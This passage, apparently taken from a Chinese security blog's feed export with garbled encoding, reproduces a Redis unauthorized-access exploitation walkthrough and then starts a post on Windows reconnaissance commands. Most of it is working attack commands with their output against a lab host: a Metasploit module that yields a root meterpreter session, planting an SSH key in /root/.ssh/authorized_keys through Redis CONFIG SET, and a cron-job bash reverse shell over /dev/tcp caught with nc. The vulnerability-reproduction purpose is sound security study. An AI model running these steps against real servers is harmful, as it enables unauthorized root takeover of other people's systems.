class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use 6</span><br><span class="line">msf6 exploit(linux/redis/redis_replication_cmd_exec) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/redis/redis_replication_cmd_exec):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   CUSTOM    true             yes       Whether compile payload file during exploiting</span><br><span class="line">   PASSWORD  foobared         no        Redis password for authentication test</span><br><span class="line">   RHOSTS    192.168.1.9      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT     6379             yes       The target port (TCP)</span><br><span class="line">   SRVHOST   192.168.1.7      yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.</span><br><span class="line">   SRVPORT   6379             yes       The local port to listen on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (linux/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.1.7      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/redis/redis_replication_cmd_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.7:4444</span><br><span class="line">[*] 192.168.1.9:6379      - Compile redis module extension file</span><br><span class="line">[+] 192.168.1.9:6379      - Payload generated successfully!</span><br><span class="line">[*] 192.168.1.9:6379      - Listening on 192.168.1.7:6379</span><br><span class="line">[*] 192.168.1.9:6379      - Rogue server close...</span><br><span class="line">[*] 192.168.1.9:6379      - Sending command to trigger payload.</span><br><span class="line">[*] Sending stage (3012548 bytes) to 192.168.1.9</span><br><span class="line">[+] 192.168.1.9:6379      - Deleted ./enfgrk.so</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.7:4444 -&gt; 192.168.1.9:58410) at 2021-07-18 02:37:24 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">/root/redis-4.0.0</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 10556 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span><br></pre></td></tr></table></figure><h5 id="2-auxiliary-scanner-redis-redis-server"><a href="#2-auxiliary-scanner-redis-redis-server" class="headerlink" title="2.auxiliary/scanner/redis/redis_server"></a>2.auxiliary/scanner/redis/redis_server</h5><p><code>æ­¤æ¨¡å—ç”¨æˆ·æ‰«æ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/redis/redis_server) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/redis/redis_server):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   COMMAND   INFO             yes       The Redis command to run</span><br><span class="line">   PASSWORD  foobared         no        Redis password for authentication test</span><br><span class="line">   RHOSTS    192.168.1.9      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT     6379             yes       The target port (TCP)</span><br><span class="line">   THREADS   1                yes       The number of concurrent threads (max one per host)</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/redis/redis_server) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.1.9:6379      - Found redis with INFO command: $2694\x0d\x0a# Server\x0d\x0aredis_version:4.0.0\x0d\x0aredis_git_sha1:00000000\x0d\x0aredis_git_dirty:0\x0d\x0aredis_build_id:8f4dd5fce9e38cfa\x0d\x0aredis_mode:standalone\x0d\x0aos:Linux 3.10.0-1062.el7.x86_64 x86_64\x0d\x0aarch_bits:64\x0d\x0amultiplexing_api:epoll\x0d\x0aatomicvar_api:atomic-builtin\x0d\x0agcc_version:4.8.5\x0d\x0aprocess_id:10244\x0d\x0arun_id:ce9cb5cafbefebe80c08eec34aaa9072942ee567\x0d\x0atcp_port:6379\x0d\x0auptime_in_seconds:3107\x0d\x0auptime_in_days:0\x0d\x0ahz:10\x0d\x0alru_clock:15980436\x0d\x0aexecutable:/root/redis-4.0.0/redis-server\x0d\x0aconfig_file:/root/redis-4.0.0/redis.conf\x0d\x0a\x0d\x0a# Clients\x0d\x0aconnected_clients:1\x0d\x0aclient_longest_output_list:0\x0d\x0aclient_biggest_input_buf:0\x0d\x0ablocked_clients:0\x0d\x0a\x0d\x0a# Memory\x0d\x0aused_memory:828920\x0d\x0aused_memory_human:809.49K\x0d\x0aused_memory_rss:8384512\x0d\x0aused_memory_rss_human:8.00M\x0d\x0aused_memory_peak:849320\x0d\x0aused_memory_peak_human:829.41K\x0d\x0aused_memory_peak_perc:97.60%\x0d\x0aused_memory_overhead:815206\x0d\x0aused_memory_startup:765576\x0d\x0aused_memory_dataset:13714\x0d\x0aused_memory_dataset_perc:21.65%\x0d\x0atotal_system_memory:1907818496\x0d\x0atotal_system_memory_human:1.78G\x0d\x0aused_memory_lua:37888\x0d\x0aused_memory_lua_human:37.00K\x0d\x0amaxmemory:0\x0d\x0amaxmemory_human:0B\x0d\x0amaxmemory_policy:noeviction\x0d\x0amem_fragmentation_ratio:10.11\x0d\x0amem_allocator:jemalloc-4.0.3\x0d\x0aactive_defrag_running:0\x0d\x0alazyfree_pending_objects:0\x0d\x0a\x0d\x0a# Persistence\x0d\x0aloading:0\x0d\x0ardb_changes_since_last_save:0\x0d\x0ardb_bgsave_in_progress:0\x0d\x0ardb_last_save_time:1626590065\x0d\x0ardb_last_bgsave_status:ok\x0d\x0ardb_last_bgsave_time_sec:-1\x0d\x0ardb_current_bgsave_time_sec:-1\x0d\x0ardb_last_cow_size:0\x0d\x0aaof_enabled:0\x0d\x0aaof_rewrite_in_progress:0\x0d\x0aaof_rewrite_scheduled:0\x0d\x0aaof_last_rewrite_time_sec:-1\x0d\x0aaof_current_rewrite_time_sec:-1\x0d\x0aaof_last_bgrewrite_status:ok\x0d\x0aaof_last_write_status:ok\x0d\x0aaof_last_cow_size:0\x0d\x0a\x0d\x0a# Stats\x0d\x0atotal_connections_received:8\x0d\x0atotal_commands_processed:19\x0d\x0ainstantaneous_ops_per_sec:0\x0d\x0atotal_net_input_bytes:135811\x0d\x0atotal_net_output_bytes:10866\x0d\x0ainstantaneous_input_kbps:0.00\x0d\x0ainstantaneous_output_kbps:0.00\x0d\x0arejected_connections:0\x0d\x0async_full:0\x0d\x0async_partial_ok:0\x0d\x0async_partial_err:0\x0d\x0aexpired_keys:0\x0d\x0aevicted_keys:0\x0d\x0akeyspace_hits:0\x0d\x0akeyspace_misses:0\x0d\x0apubsub_channels:0\x0d\x0apubsub_patterns:0\x0d\x0alatest_fork_usec:0\x0d\x0amigrate_cached_sockets:0\x0d\x0aslave_expires_tracked_keys:0\x0d\x0aactive_defrag_hits:0\x0d\x0aactive_defrag_misses:0\x0d\x0aactive_defrag_key_hits:0\x0d\x0aactive_defrag_key_misses:0\x0d\x0a\x0d\x0a# Replication\x0d\x0arole:master\x0d\x0aconnected_slaves:0\x0d\x0amaster_replid:17593e6719397e611d460c1dabbc2367aaef7a0c\x0d\x0amaster_replid2:0d01cdc14e2ca06ce5125014632c67982313d816\x0d\x0amaster_repl_offset:0\x0d\x0asecond_repl_offset:1\x0d\x0arepl_backlog_active:0\x0d\x0arepl_backlog_size:1048576\x0d\x0arepl_backlog_first_byte_offset:0\x0d\x0arepl_backlog_histlen:0\x0d\x0a\x0d\x0a# CPU\x0d\x0aused_cpu_sys:2.68\x0d\x0aused_cpu_user:0.86\x0d\x0aused_cpu_sys_children:0.15\x0d\x0aused_cpu_user_children:0.01\x0d\x0a\x0d\x0a# Cluster\x0d\x0acluster_enabled:0\x0d\x0a\x0d\x0a# Keyspace</span><br><span class="line">[*] 192.168.1.9:6379      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf6 auxiliary(scanner/redis/redis_server) &gt;</span><br></pre></td></tr></table></figure><h5 id="3-auxiliary-gather-redis-extractor"><a href="#3-auxiliary-gather-redis-extractor" class="headerlink" title="3.auxiliary/gather/redis_extractor"></a>3.auxiliary/gather/redis_extractor</h5><p><code>è·å–ç‰ˆæœ¬</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(gather/redis_extractor) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/gather/redis_extractor):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   PASSWORD  foobared         no        Redis password for authentication test</span><br><span class="line">   RHOSTS    192.168.1.9      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT     6379             yes       The target port (TCP)</span><br><span class="line">   THREADS   1                yes       The number of concurrent threads (max one per host)</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(gather/redis_extractor) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.1.9:6379      - Connected to Redis version 4.0.0</span><br><span class="line">[*] 192.168.1.9:6379      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf6 auxiliary(gather/redis_extractor) &gt;</span><br></pre></td></tr></table></figure><h4 id="03-å†™å…¥SSHå…¬é’¥å®ç°SSHç™»å½•"><a href="#03-å†™å…¥SSHå…¬é’¥å®ç°SSHç™»å½•" class="headerlink" title="03.å†™å…¥SSHå…¬é’¥å®ç°SSHç™»å½•"></a>03.<strong>å†™å…¥SSHå…¬é’¥å®ç°SSHç™»å½•</strong></h4><blockquote><p>åŸç†å°±æ˜¯åœ¨æ•°æ®åº“ä¸­æ’å…¥ä¸€æ¡æ•°æ®ï¼Œå°†æœ¬æœºçš„å…¬é’¥ä½œä¸ºvalue,keyå€¼éšæ„ï¼Œç„¶åé€šè¿‡ä¿®æ”¹æ•°æ®åº“çš„é»˜è®¤è·¯å¾„ä¸º/root/.sshå’Œé»˜è®¤çš„ç¼“å†²æ–‡ä»¶authorized.keys,æŠŠç¼“å†²çš„æ•°æ®ä¿å­˜åœ¨æ–‡ä»¶é‡Œï¼Œè¿™æ ·å°±å¯ä»¥åœ¨æœåŠ¡å™¨ç«¯çš„/root/.sshä¸‹ç”Ÿä¸€ä¸ªæˆæƒçš„keyã€‚</p></blockquote><p><code>kaliå…ˆç”Ÿæˆsshå…¬é’¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# ssh-keygen -t rsa                                                                                                                                     1 â¨¯</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file in which to save the key (/root/.ssh/id_rsa):</span><br><span class="line">Enter passphrase (empty for no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved in /root/.ssh/id_rsa</span><br><span class="line">Your public key has been saved in /root/.ssh/id_rsa.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:v7Cz1OKpvm8nlkBgWEmfcXmle+dprjPETRabUpr2pYk root@kali</span><br><span class="line">The key&#x27;s randomart image is:</span><br><span class="line">+---[RSA 3072]----+</span><br><span class="line">|   +o.. .. ..    |</span><br><span class="line">|  . +. +. ..  o  |</span><br><span class="line">|   . .o  ..  + + |</span><br><span class="line">|      .    .= = .|</span><br><span class="line">|     .  S .o.B.+ |</span><br><span class="line">|      .  o .Eo=. |</span><br><span class="line">|       .+.o.  +  |</span><br><span class="line">|       o*=..oo   |</span><br><span class="line">|     .+**=. .+.  |</span><br><span class="line">+----[SHA256]-----+</span><br></pre></td></tr></table></figure><p><code>å°†å…¬é’¥å†™å…¥key.txt</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# (echo -e &quot;\n&quot;;cat /root/.ssh/id_rsa.pub;echo -e &quot;\n&quot;)&gt;key.txt</span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# cat key.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPQNEvzuCM3mruZvGSf1h6N56NItvVRApcAcPZQqsG8hnTmQCqPMucVqVNJEaPn9/EcOLayXtPkiS8HjEqUBg3OqMJS7YdCedx89uUk2zD4MxbBY4HjBn0zRgtDlGBbopDPnbPIok1jM9agFsHp3hJUlspBHMvKha6iZOGZZOAnjy/Aa4VV9u/idPhpqyIdXKv+EsJ/hgKP27kgxc+sFmm0AUj+KrhoIc7Ah5lW14w+GRSIpxcYfU3Fv9qydOm4bJ4HR/8Fqq15VLUpkfLy93okLDaaK1FZYyQ9cF+2dvrn9hcCFvxX8fQ7D6Xi3AxsWt3L4dWioM9CmEeSCa/vqP3IiAI2rkbq5A6uW+ydDE16OTgDEPQjjInqfy5T/jrqb2OeBaJ4ro7cr04hQWJ/PO6a9+XlW3kEYnb2kdJy3AgBOFAOyhdzY20/8frUJLEyQix6TKC9JCqOp3uGY2z33KseJzPka6tC+Dzco0Y010WQMutneRf+Li5YADJagHPBWU= root@kali</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>å°†key.txtå†™å…¥redisç¼“å†²åŒº</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# cat key.txt | redis-cli -h 192.168.1.9 -x set key</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">è¿™é‡Œå¯èƒ½éœ€è¦å…³é—­RDBæŒä¹…åŒ– 192.168.1.9:6379&gt; config <span class="built_in">set</span> stop-writes-on-bgsave-error no</span></span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# redis-cli  -h 192.168.1.9</span><br><span class="line">192.168.1.9:6379&gt;</span><br><span class="line">192.168.1.9:6379&gt; CONFIG SET dir /root/.ssh</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; CONFIG SET dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; save</span><br><span class="line">OK</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ç™»å…¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# ssh -i /root/.ssh/id_rsa root@192.168.1.9</span><br><span class="line">Last login: Sun Jul 18 23:57:55 2021 from 192.168.1.7</span><br><span class="line">[root@mail ~]#</span><br></pre></td></tr></table></figure><h4 id="04-cornå®šæ—¶ä»»åŠ¡åå¼¹shell"><a href="#04-cornå®šæ—¶ä»»åŠ¡åå¼¹shell" class="headerlink" title="04.cornå®šæ—¶ä»»åŠ¡åå¼¹shell"></a>04.cornå®šæ—¶ä»»åŠ¡åå¼¹shell</h4><p><code>kaliç›‘å¬</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# nc -nvlp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>kaliç™»å…¥rediså†™å…¥åå¼¹shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# redis-cli  -h 192.168.1.9</span><br><span class="line">192.168.1.9:6379&gt; set demo &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.1.7/4444 0&gt;&amp;1\n\n&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; config set dir /var/spool/cron</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; config set dbfilename root</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">å‰åç”¨\næ¢è¡Œï¼Œé¿å…å’Œredisé‡Œå…¶ä»–ç¼“å­˜æ•°æ®æ··åˆ</span></span><br></pre></td></tr></table></figure><p><code>å¾—åˆ°shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# nc -nvlp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.1.7] from (UNKNOWN) [192.168.1.9] 35030</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">[root@mail ~]#</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Redisæœªæˆæƒè®¿é—®æ¼æ´&quot;&gt;&lt;a href=&quot;#Redisæœªæˆæƒè®¿é—®æ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;Redisæœªæˆæƒè®¿é—®æ¼æ´&quot;&gt;&lt;/a&gt;Redisæœªæˆæƒè®¿é—®æ¼æ´&lt;/h1&gt;&lt;h2 id=&quot;ä¸€ã€æ¼æ´ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ä¸€ã€æ¼æ´ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ä¸€ã€æ¼æ´ç®€ä»‹&quot;&gt;&lt;/a&gt;ä¸€ã€æ¼æ´ç®€ä»‹&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Redisé»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šç»‘å®šåœ¨0.0.0.0:6379(åœ¨redis3.2ä¹‹åï¼Œrediså¢åŠ äº†protected-modeï¼Œåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹ï¼Œéç»‘å®šIPæˆ–è€…æ²¡æœ‰é…ç½®å¯†ç è®¿é—®æ—¶éƒ½ä¼šæŠ¥é”™)ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œé‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æºipè®¿é—®ç­‰ç­‰ï¼Œè¿™æ ·å°†ä¼šå°†RedisæœåŠ¡æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯(é»˜è®¤ä¸ºç©º)çš„æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—®Redisä»¥åŠè¯»å–Redisçš„æ•°æ®ã€‚æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—®Redisçš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨Redisè‡ªèº«çš„æä¾›çš„configå‘½ä»¤ï¼Œå¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ”»å‡»è€…è¿˜å¯ä»¥æˆåŠŸå°†è‡ªå·±çš„sshå…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„/root/.sshæ–‡ä»¶çš„authotrized_keys æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨å¯¹åº”ç§é’¥ç›´æ¥ä½¿ç”¨sshæœåŠ¡å™¨ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚&lt;/p&gt;
&lt;p&gt;æ¼æ´çš„äº§ç”Ÿæ¡ä»¶æœ‰ä»¥ä¸‹ä¸¤ç‚¹:&lt;/p&gt;
&lt;p&gt;(1)  Redisç»‘å®šåœ¨0.0.0.0:6379,ä¸”æ²¡æœ‰è¿›è¡Œæ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æºipè®¿é—®ç­‰ç›¸å…³å®‰å…¨ç­–ç•¥ï¼Œç›´æ¥æš´éœ²åœ¨å…¬ç½‘&lt;/p&gt;
&lt;p&gt;(2)  æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆé»˜è®¤ä¸ºç©ºï¼‰æˆ–è€…å¼±å¯†ç ï¼Œå¯ä»¥å…å¯†ç ç™»å½•redisæœåŠ¡&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Redis" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis/"/>
    
    
    <category term="Redis" scheme="https://lunamoore.github.io/tags/Redis/"/>
    
    <category term="è°ƒæ•™" scheme="https://lunamoore.github.io/tags/%E8%B0%83%E6%95%99/"/>
    
  </entry>
  
  <entry>
    <title>å†…ç½‘æ¸—é€æµ‹è¯•-ä¿¡æ¯æ”¶é›†</title>
    <link href="https://lunamoore.github.io/2021/07/17/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://lunamoore.github.io/2021/07/17/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2021-07-17T10:39:19.000Z</published>
    <updated>2021-07-17T10:56:12.337Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-å·¥ä½œç»„ä¿¡æ¯æ”¶é›†"><a href="#0x01-å·¥ä½œç»„ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.å·¥ä½œç»„ä¿¡æ¯æ”¶é›†"></a>0x01.å·¥ä½œç»„ä¿¡æ¯æ”¶é›†</h2><h3 id="01-æ£€æµ‹å½“å‰shellæƒé™"><a href="#01-æ£€æµ‹å½“å‰shellæƒé™" class="headerlink" title="01.æ£€æµ‹å½“å‰shellæƒé™"></a>01.æ£€æµ‹å½“å‰shellæƒé™</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami /user    #æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„SID</span><br><span class="line">whoami /priv    #æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„å®‰å…¨æƒé™</span><br><span class="line">whoami /all</span><br></pre></td></tr></table></figure><h3 id="02-æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¿¡æ¯"><a href="#02-æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¿¡æ¯" class="headerlink" title="02.æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¿¡æ¯"></a>02.æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><h3 id="03-tcp-udp-ç½‘ç»œè¿æ¥çŠ¶æ€"><a href="#03-tcp-udp-ç½‘ç»œè¿æ¥çŠ¶æ€" class="headerlink" title="03.tcp/udp ç½‘ç»œè¿æ¥çŠ¶æ€"></a>03.tcp/udp ç½‘ç»œè¿æ¥çŠ¶æ€</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -nao</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="04-ä¸»æœºå"><a href="#04-ä¸»æœºå" class="headerlink" title="04.ä¸»æœºå"></a>04.ä¸»æœºå</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure><h3 id="05-å½“å‰æ“ä½œç³»ç»Ÿç‰ˆæœ¬"><a href="#05-å½“å‰æ“ä½œç³»ç»Ÿç‰ˆæœ¬" class="headerlink" title="05.å½“å‰æ“ä½œç³»ç»Ÿç‰ˆæœ¬"></a>05.å½“å‰æ“ä½œç³»ç»Ÿç‰ˆæœ¬</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ver</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS name&quot; /C:&quot;OS Version&quot;    #è‹±æ–‡ç‰ˆ</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS åç§°&quot; /C:&quot;OS ç‰ˆæœ¬&quot;    #ä¸­æ–‡ç‰ˆ</span><br><span class="line">wmic OS GET Caption,CSDVersion,OSArchitecture,Version    #æ›´è¯¦ç»†</span><br></pre></td></tr></table></figure><h3 id="06-æŸ¥çœ‹ç³»ç»Ÿä½“ç³»ç»“æ„"><a href="#06-æŸ¥çœ‹ç³»ç»Ÿä½“ç³»ç»“æ„" class="headerlink" 